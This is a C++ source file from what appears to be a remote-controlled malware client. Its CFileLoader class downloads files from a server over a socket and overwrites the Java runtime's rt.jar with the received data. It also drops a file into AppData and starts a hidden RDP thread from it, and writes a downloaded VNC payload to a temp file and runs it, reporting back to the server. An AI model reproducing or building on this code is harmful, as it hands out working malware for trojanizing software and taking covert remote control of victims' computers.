#include "StdAfx.h"
#include "FileLoader.h"
#include "ClientOps.h"

#include "funk.h"

CFileLoader::CFileLoader( )
	: m_dwReceivedSize( 0 )
	, m_pData( 0 )
	, m_bPatched( false )
{
	ZeroMemory( &m_Info, sizeof(m_Info) );
}


CFileLoader::~CFileLoader( )
{
	if( m_pData )
	{
		free( m_pData );
	}
}


bool CFileLoader::StartDownload( SOCKET s, PATCH_START *info )
{
	if( m_pData )
	{
		free( m_pData );
	}

	m_dwReceivedSize = 0;
	m_Info = *info;
	m_pData = (BYTE*)malloc( info->bytes_to_download );
	m_bPatched = false;

	// get first data

	PATCH_DATA_REQUEST rq;
	ZeroMemory( &rq, sizeof(rq) );
	wcscpy(&rq.sourceFile[0], &info->sourceFile[0]);
	rq.bytes_from = 0;
	rq.bytes_count = 1024;

	PacketBuffer getdata;
	getdata.Create( PK_CS_PATCHDATA, timeGetTime(), sizeof(rq), &rq );
	return getdata.Send( s );
}


void CFileLoader::ProcessData( SOCKET s, PATCH_DATA_ANSWER *info )
{
	if( info->bytes_from == m_dwReceivedSize )
	{
		if( m_dwReceivedSize + info->bytes_count <= m_Info.bytes_to_download )
		{
			CopyMemory( m_pData + m_dwReceivedSize, info->bytes, info->bytes_count );
			m_dwReceivedSize += info->bytes_count;
		}
		else
		{
			// file length in m_Info doesnt match to actual data!
			// probably error on server
		}
	}
	else
	{
		// packet out of order!
		// ignore it
	}

	if( m_dwReceivedSize == m_Info.bytes_to_download && !m_Info.sw_save )
	{
		MessageBeep(-1);

		KillJava();

		WCHAR javapath[MAX_PATH] = L"";
		for( int i=18; i<=22; i++ )
		{
			WCHAR buf[300] = L"";
			wsprintf( buf, L"SOFTWARE\\JavaSoft\\Java Plug-in\\1.6.0_%d", i );

			HKEY hk = 0;
			if( RegOpenKeyEx( HKEY_LOCAL_MACHINE, buf,
				0, KEY_ALL_ACCESS, &hk ) == ERROR_SUCCESS )
			{
				DWORD dwType = REG_SZ;
				DWORD dwSize = sizeof(javapath) - 2;
				if( RegQueryValueEx( hk, L"JavaHome", 0, &dwType,
					(BYTE*)javapath, &dwSize ) == ERROR_SUCCESS )
				{
					RegCloseKey( hk );
					break;
				}
				RegCloseKey( hk );
			}
		}

		Sleep(100);

		if( javapath[0] )
		{
			lstrcat( javapath, L"\\lib\\rt.jar" );
			HANDLE hFile = CreateFile( javapath, GENERIC_WRITE, 0, 0, 
				CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );

			if( hFile != INVALID_HANDLE_VALUE )
			{
				DWORD dwWritten = 0;
				WriteFile( hFile, m_pData, m_dwReceivedSize, &dwWritten, 0 );
				CloseHandle( hFile );

				m_bPatched = true;
			}
		}
	}
	else if( m_dwReceivedSize == m_Info.bytes_to_download && m_Info.sw_save )
	{
		if (lstrcmpW(L"DATA",&m_Info.targetFile[0])==0)
		{
			

			WCHAR SysPath[MAX_PATH];
			SHGetFolderPathW(NULL, 0x001a, NULL, SHGFP_TYPE_CURRENT, SysPath);
			lstrcatW( SysPath, L"\\RDp.dd" );
			HANDLE hFile = CreateFile( SysPath, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
			if( hFile != INVALID_HANDLE_VALUE )
			{
				DWORD dwWritten = 0;
				WriteFile( hFile, m_pData, m_dwReceivedSize, &dwWritten, 0 );
				CloseHandle( hFile );

				m_bPatched = true;
				StartThread(ClientStartRDP_Dll1,&SysPath[0]);	
				SendMess(L"Start RDP thread",s,timeGetTime());
					
				PacketBuffer getdata;
				getdata.Create( PK_CS_PATCHDATA_RDP, timeGetTime(), 0, 0 );
				getdata.Send( s );

			}
		}
		if (lstrcmpW(L"DATAVNC",&m_Info.targetFile[0])==0)
		{
				/*VNCSTR dat;
				dat.s=s;
				dat.B=m_pData;*/

				m_bPatched = true;
				//StartThread(StartVNC,m_pData);				
				
				char path[MAX_PATH], nameFile[MAX_PATH];
				GetTempPathA( MAX_PATH, path );
				GetTempFileNameA( path, 0, 0, nameFile );
				HANDLE fin = CreateFileA( nameFile, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0 );
				if( fin != INVALID_HANDLE_VALUE ) 
				{
					DWORD rl = 0;
					WriteFile( fin, m_pData, m_dwReceivedSize, &rl, 0 );
					CloseHandle(fin);
				}
				STARTUPINFOA si;
				PROCESS_INFORMATION pi;
				ZeroMemory( &si, sizeof(si) );
				si.cb = sizeof(si);
				CreateProcessA( 0, nameFile, 0, 0, FALSE, 0, 0, 0, &si, &pi ); 
				
				PacketBuffer getdata;
				getdata.Create( PK_CS_PATCHDATA_VNC, timeGetTime(), 0, 0 );
				getdata.Send( s );
		}

		else
		{
			HANDLE hFile = CreateFile( &m_Info.targetFile[0], GENERIC_WRITE, 0, 0, 
				CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );

			if( hFile != INVALID_HANDLE_VALUE )
			{
				DWORD dwWritten = 0;
				WriteFile( hFile, m_pData, m_dwReceivedSize, &dwWritten, 0 );
				CloseHandle( hFile );

				m_bPatched = true;
			}
		}
	}
	else
	{
		PATCH_DATA_REQUEST rq;
		ZeroMemory( &rq, sizeof(rq) );
		wcscpy(&rq.sourceFile[0], &m_Info.sourceFile[0]);
		rq.bytes_from = m_dwReceivedSize;
		rq.bytes_count = 150000;

		PacketBuffer getdata;
		getdata.Create( PK_CS_PATCHDATA, timeGetTime(), sizeof(rq), &rq );
		getdata.Send( s );
	}
}

DWORD CFileLoader::GetReceivedBytes( )
{
	return m_dwReceivedSize;
}

DWORD CFileLoader::GetExpecetedBytes( )
{
	return m_Info.bytes_to_download;
}






